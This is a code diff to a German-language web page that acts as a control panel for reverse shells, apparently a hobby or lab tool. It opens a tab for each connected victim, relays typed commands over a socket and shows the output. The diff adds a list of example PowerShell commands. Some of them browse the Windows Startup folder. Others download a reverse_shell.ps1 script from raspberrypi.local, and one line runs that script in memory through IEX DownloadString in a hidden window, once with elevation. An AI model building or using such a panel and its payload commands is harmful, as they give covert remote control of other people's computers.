@@ -16,6 +16,7 @@
     .shellcontainer{
       flex: 1;
       width: 100%;
+      overflow: hidden;
     }
 
     .shell{
@@ -25,6 +26,7 @@
       flex-direction: column;
       overflow: hidden;
     }
+
     .shell.active{
       display: flex;
     }
@@ -34,20 +36,37 @@
       width: 100%;
       background: #ddd;
       max-height: calc(100% - 40px);
-      overflow-y: scroll;
+      overflow-y: auto;
     }
+
+.responsecontainer p{
+	margin-left: 20px
+}
+
+.responsecontainer .response{
+opacity: 0.6;
+}
+
     .inputcontainer{
       display: flex;
+	border-bottom: 2px solid #999;
       flex-shrink: 0;
     }
 
     .button{
       display: inline-block;
       padding: 10px 20px;
-      background: blue;
+      background: #666;
       color: white;
       text-decoration: none;
     }
+
+.button#send{
+background: blue;
+}
+.button#expand{
+margin-left: 3px;
+}
 
     .button:hover{
       opacity: 0.9;
@@ -66,16 +85,48 @@
     }
 
     .tabbuttoncontainer > *{
-      padding: 2px 10px;
-    }
+          }
 
     .tabbuttoncontainer input{
       display: none;
     }
 
+.tabbuttoncontainer .toggle{
+padding: 3px 15px;
+}
+
     .tabbuttoncontainer input:checked ~.toggle{
       color: red;
+background: #ddd;
     }
+
+.examples{
+background: #333;
+color: #eee;
+overflow:hidden;
+height: 230px;
+transition: height 0.2s;
+}
+
+.examples ul{
+padding-left: 15px;
+	overflow: auto;
+	height: 230px;
+display: block;
+}
+
+.examples.hidden{
+height: 0px;
+}
+
+.examples li{
+	display: inline-block;
+	cursor: pointer;
+	border: 1px solid;
+	padding: 5px 15px;
+	margin-bottom: 0.25em;
+}
+
 
     .noshelloverlay{
       position: fixed;
@@ -103,6 +154,35 @@
   </style>
 
   <script type="text/javascript">
+    $(document).ready(()=>{
+    	$('.examples li').click((a)=>{
+        var command = a.target.innerText
+        $('.shell.active input')[0].value = command
+      })
+
+
+
+      $('body').keyup((event)=>{
+        event.preventDefault();
+        var id = $('.active').attr('id');
+
+        if(event.keyCode === 13){
+          sendCommand(id);
+        }
+      })
+
+
+})
+
+function toggleExamples(){
+if(!$('.examples.hidden')[0]){
+$('.examples').addClass('hidden');
+}else{
+$('.examples').removeClass('hidden');
+}
+}
+
+
     function makeActive(id){
       $('.shell').removeClass('active')
       $('.shell#'+id).addClass('active')
@@ -112,56 +192,88 @@
 
     function addShell(id){
       //check if shell with id not already exists
-      console.log($('.shell#'+ id)[0])
+      //console.log($('.shell#'+ id)[0])
       if(!$('.shell#'+ id)[0]){
-        $('.tabbuttoncontainer').append('<label for="'+id+'" onclick="makeActive(\''+id+'\')"><input type="radio" name="activeShell" id="'+id+'"/><div class="toggle">Reverse Shell '+ id +'</div></label>')
-        $('.shellcontainer').append('<div class="shell" id="'+id+'"><div class="responsecontainer"></div><div class="inputcontainer"><input type="text" placeholder="Command"/><a href="#" class="button" onclick="sendCommand(\''+id+'\')">Send</a></div></div>');
+        $('.tabbuttoncontainer').append('<label for="'+id+'" onclick="makeActive(\''+id+'\')"><input type="radio" name="activeShell" id="'+id+'"/><div class="toggle">Reverse Shell ID:'+ id +'</div></label>')
+        $('.shellcontainer').append('<div class="shell" id="'+id+'"><div class="responsecontainer"></div><div class="inputcontainer"><input type="text" placeholder="enter a command here"/><a id="send" href="#" class="button" onclick="sendCommand(\''+id+'\')">Send</a> <a href="#" class="button" onclick="toggleExamples()" id="expand">examples</a></div></div>');
         makeActive(id)
         $('.noshelloverlay').addClass('hidden')
       }
     }
 
-    function sendCommand(id){
-      command = $('.shell#'+id+' .inputcontainer input')[0].value
-      $('.shell#'+id+' .inputcontainer input')[0].value = ""
-      socket.emit('command', {'command': command, 'id': id})
-    }
 
-      const socket = io('http://raspberrypi.local');
+      function sendCommand(id){
+        command = $('.shell#'+id+' .inputcontainer input')[0].value
+  	    if(command == '') return;
+        $('.shell#'+id+' .inputcontainer input')[0].value = ""
+        socket.emit('command', {'command': command, 'id': id})
+      }
+
+      var host = window.location.hostname
+      const socket = io(host);
+      console.log('Connecting to WebSocket at '+host);
 
       socket.on('new shell', (id)=>{
         addShell(id)
       })
 
-socket.on('close', (id)=>{
-//alert('socket closed')
-$('.shell#'+id).remove()
-$(".tabbuttoncontainer label[for='"+id+"']").remove()
-if(!$('.shellcontainer .shell')[0]){
-$('.noshelloverlay').removeClass('hidden')
-}
-})
+      socket.on('close', (id)=>{
+        //alert('socket closed')
+        $('.shell#'+id).remove()
+        $(".tabbuttoncontainer label[for='"+id+"']").remove()
+
+
+        if(!$('.shellcontainer .shell')[0]){
+          $('.noshelloverlay').removeClass('hidden')
+        }else if(!$('.shell.active')[0]){
+          $('.shell').first().addClass('active')
+          $('.tabbuttoncontainer input').first()[0].checked = true;
+        }
+
+      })
 
       socket.on('command', (data)=>{
-        $('.shell#'+data.id+' .responsecontainer').append('<p class="command">'+data.command+'</p>')
+        $('.shell#'+data.id+' .responsecontainer').append('<p class="command">> '+data.command+'</p>')
+        var elem = $('.shell#'+data.id+' .responsecontainer')[0]
+        elem.scrollTop = elem.scrollHeight
       })
 
       socket.on('response', (data)=>{
         $('.shell#'+data.id+' .responsecontainer').append('<p class="response">'+data.response+'</p>')
+        var elem = $('.shell#'+data.id+' .responsecontainer')[0]
+        elem.scrollTop = elem.scrollHeight
       })
 
       socket.on('disconnect', ()=>{
         $('.tabbuttoncontainer').html('');
         $('.shellcontainer').html('');
         $('.noshelloverlay').removeClass('hidden')
-console.log('Verbindung unterbrochen')
+        console.log('Verbindung unterbrochen')
       })
+
 
   </script>
 </head>
 <body>
   <div class="tabbuttoncontainer"></div>
   <div class="shellcontainer"></div>
+  <div class="examples">
+    <ul>
+      <li style="color:#fff">cd 'C:\Users\testo\Desktop'</li>
+      <li style="color:#fff">cd "C:\Users\testo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"</li>
+      <li style="color:#aaa">dir</li>
+      <li style="color:#00f">Get-Location</li>
+      <li style="color:#0af">mkdir Ordnername</li>
+      <li style="color:#3c4">del Dateiname</li>
+      <li style="color:#fd0">Start-Process explorer.exe -ArgumentList "C:\Users\testo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"</li>
+      <li style="color:#fd0">Start-Process chrome.exe -ArgumentList "http://raspberrypi.local/hacking"</li>
+      <li style="color:#f82">Stop-Process -name chrome</li>
+      <li style="color:#f82">Get-Process | Where {$_.MainWindowTitle -like "Autostart"} | Stop-Process</li>
+      <li style="color:#f43">WGET "http://raspberrypi.local/files/reverse_shell.ps1" -UseBasicParsing -OutFile "reverse-shell.ps1"</li>
+      <li style="color:#f1c">Start-Process powershell.exe -ArgumentList "IEX (New-Object Net.WebClient).DownloadString('http://raspberrypi.local/files/reverse_shell.ps1');" -WindowStyle Hidden; exit</li>
+      <li style="color:#f1c">Start-Process powershell.exe -ArgumentList "IEX (New-Object Net.Webclient).DownloadString('http://raspberrypi.local/files/reverse_shell.ps1');" -WindowStyle Hidden -verb runas; exit</li>
+    </ul>
+  </div>
   <div class="noshelloverlay"><span>Keine offene Reverse-Shell-Verbindung gefunden</span></div>
 </body>
 </html>
